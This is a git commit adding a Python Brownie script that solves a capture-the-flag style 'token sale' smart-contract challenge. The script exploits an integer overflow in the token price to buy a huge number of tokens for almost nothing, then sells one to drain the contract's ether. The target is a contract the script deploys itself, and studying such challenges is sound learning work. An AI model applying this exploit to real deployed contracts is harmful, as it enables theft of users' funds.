23e698be0546d48aa66feffef918caaca9acda4e
Tomasz <tgrykias@protonmail.com>
2022-02-19 20:06:25 +0100

    add solution to token sale challenge

---
+++ scripts/solve_token_sale.py
@@ -0,0 +1,33 @@
+import math
+from brownie import (
+    network,
+    accounts,
+    config,
+    interface,
+    Contract,
+    TokenSaleChallenge
+)
+from scripts.helpful_scripts import (
+    get_account,
+    get_contract_address,
+    check_solution,
+)
+from web3 import Web3
+
+
+def main():
+    player = get_account()
+    challenge_contract = TokenSaleChallenge.deploy(player, {"from": player, "value": Web3.toWei(1.0, "ether")})
+
+    num_tokens = (2 ** 256) // (10 ** 18) + 1
+    num_wei = (num_tokens * (10 ** 18)) % (2 ** 256)
+    print('Number of tokens:', num_tokens)
+    print('Price of these tokens:', Web3.fromWei(num_wei, "ether"), "ETH")
+    print()
+
+    tx = challenge_contract.buy(num_tokens, {"from": player, "value": Web3.toWei(num_wei, "wei")})
+    tx.wait(1)
+    tx = challenge_contract.sell(1, {"from": player})
+    tx.wait(1)
+
+    check_solution(challenge_contract.address)
